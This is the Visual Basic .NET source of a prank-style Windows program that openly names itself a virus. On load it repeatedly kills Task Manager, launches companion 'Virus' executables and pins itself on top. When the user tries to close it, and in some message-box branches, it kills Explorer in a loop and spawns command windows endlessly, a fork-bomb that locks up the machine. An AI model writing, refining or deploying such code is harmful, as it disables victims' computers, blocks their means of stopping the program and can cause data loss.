Imports System.Diagnostics
Imports System.IO
Public Class Form1
    Sub task()
        While True
            For Each k As Process In Process.GetProcessesByName("taskmgr")
                k.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("explorer")
                p.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
        Dim t As New Threading.Thread(AddressOf block)
        Dim q As New Threading.Thread(AddressOf task)
        t.Start()
        q.Start()
        Do
            Process.Start("cmd")
        Loop
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim f2 As Form2 = New Form2
        Dim f3 As Form3 = New Form3
        Dim f4 As Form4 = New Form4
        Dim msg As Integer
        Dim cancel As Integer
        Dim goback As Integer
        f2.Show()
        f3.Show()
        f4.Show()
        Me.Hide()
        f2.Location = New Point(Rnd() * 900, Rnd() * 180)
        f3.Location = New Point(Rnd() * 860, Rnd() * 300)
        f4.Location = New Point(Rnd() * 700, Rnd() * 480)
Line1:
        msg = MsgBox("Do You Know You Can Close This In Task Manager", 1, "Click ok to see next messange")
        If msg = vbOK Then
            msg = MsgBox("You Computer Will be Useless If You Force To Close Me :)", 16, "fr:)")
            If msg = vbOK Then
                MsgBox("Nah I Was Just Kidding, Keep Going:)")
            End If
        ElseIf msg = vbCancel Then
Line2:
            cancel = MsgBox("HOW DARE YOU PRESS CANCEL!!", vbCancel, "Pls go back")
            If cancel = vbAbort Then
                goback = MsgBox("You Need To Click Retry To Go Back", 64, "Go Back")
                If goback = vbOK Then
                    GoTo Line2
                End If
            ElseIf cancel = vbIgnore Then
                MsgBox("enjoy:)", 0, "How Dare You Ignore This Message!!")
                If vbOK Then
                    Dim t As New Threading.Thread(AddressOf block)
                    Dim r As New Threading.Thread(AddressOf task)
                    t.Start()
                    r.Start()
                    Do
                        Process.Start("cmd")
                    Loop
                End If
            ElseIf cancel = vbRetry Then
                GoTo Line1
            End If
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim d As New Threading.Thread(AddressOf task)
        d.Start()
        Process.Start("Virus 3 (Only Work With Virus).exe")
        Threading.Thread.Sleep(10000)
        Process.Start("Virus 2 (Only Work With Virus).exe")
        Me.TopMost = True
    End Sub
End Class
